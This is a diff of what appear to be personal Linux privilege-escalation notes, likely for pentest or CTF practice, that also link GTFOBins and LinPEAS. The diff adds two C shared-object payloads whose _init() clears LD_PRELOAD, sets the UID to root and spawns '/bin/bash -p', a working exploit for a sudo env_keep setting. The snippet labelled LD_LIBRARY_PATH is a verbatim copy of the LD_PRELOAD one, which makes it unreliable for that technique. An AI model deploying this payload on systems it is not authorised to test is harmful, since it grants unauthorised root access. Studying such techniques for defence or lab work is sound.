@@ -6,7 +6,30 @@
 
 4. https://gtfobins.github.io/ followed the interesting tools that can exploit 
 
-- https://www.kumaratuljaiswal.in/2021/06/tryhackme-res-redis-pentesting.html <== xxd step for reading a file if SUID is set
+5. Take advantage of LD_PRELOAD in evn_keep
+
+```#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+	unsetenv("LD_PRELOAD");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
+```
+Take advantage of LD_LIBRARY_PATH in evn_keep
+```#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+	unsetenv("LD_PRELOAD");
+	setresuid(0,0,0);
+	system("/bin/bash -p");
+}
+```
+
 
 5. 
 LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
